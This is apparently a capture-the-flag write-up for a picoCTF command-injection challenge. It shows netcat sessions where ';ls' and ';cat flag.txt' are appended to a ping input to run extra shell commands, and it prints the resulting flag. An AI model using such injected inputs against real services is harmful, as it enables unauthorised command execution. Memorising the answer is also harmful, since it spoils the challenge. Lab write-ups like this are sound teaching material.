Author: Yahaya Meddy

100pt.
#### Description

Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

Additional details will be available after launching your challenge instance.

Hints:
1. The program uses a shell command behind the scenes.
2. Sometimes, You can run more than one command at a time.


---

```bash
└─$ nc mysterious-sea.picoctf.net 65391
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.58 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.57 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.566/8.574/8.582/0.008 ms
flag.txt
script.sh

```

```bash
└─$ nc mysterious-sea.picoctf.net 65391
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.59 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.58 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.578/9.581/9.585/0.003 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d} 
```